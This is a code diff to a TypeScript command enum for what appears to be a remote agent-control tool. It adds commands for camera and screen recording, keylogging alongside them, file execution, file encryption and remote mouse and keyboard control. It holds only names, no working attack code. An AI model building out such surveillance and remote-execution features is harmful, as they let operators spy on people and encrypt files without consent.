@@ -14,10 +14,13 @@ export enum CommandType {
     PROC_START = "STARTPROC",
     PROC_KILL = "STOPPROC",
 
-    CAM_RECORD = "cam_record",
+    CAM_RECORD = "CAM_RECORD",
+    CAM_SHOT = "CAMSHOT",
+    SCR_RECORD = "SCR_RECORD",
     SCREENSHOT = "SCRSHOT",
     START_KEYLOG = "STARTKLOG",
     STOP_KEYLOG = "STOPKLOG",
+    STREAM_DATA = "stream_data",
 
     SHUTDOWN = "shutdown",
     RESTART = "restart",
@@ -34,18 +37,27 @@ export enum CommandType {
     GET_USER_PREFERENCES = "get_user_preferences",
     DELETE_USER_PREFERENCE = "delete_user_preference",
 
-    // Agent Tags
     ADD_AGENT_TAG = "add_agent_tag",
     REMOVE_AGENT_TAG = "remove_agent_tag",
     GET_AGENTS_BY_TAG = "get_agents_by_tag",
     GET_AGENT_TAGS = "get_agent_tags",
     GET_ALL_TAGS = "get_all_tags",
 
-    // File Transfer
     FILE_UPLOAD = "file_upload",
     FILE_DOWNLOAD = "file_download",
     FILE_CHUNK = "file_chunk",
     FILE_PROGRESS = "file_progress",
     FILE_COMPLETE = "file_complete",
-    FILE_LIST = "file_list"
+    FILE_LIST = "file_list",
+    FILE_EXECUTE = "file_execute",
+    FILE_ENCRYPT = "file_encrypt",
+    SYSTEM_INFO = "system_info",
+
+    START_STREAM = "start_stream",
+    STOP_STREAM = "stop_stream",
+    STREAM_FRAME = "stream_frame", 
+    
+    MOUSE_MOVE = "mouse_move",
+    MOUSE_CLICK = "mouse_click",
+    KEY_EVENT = "key_event",
 }
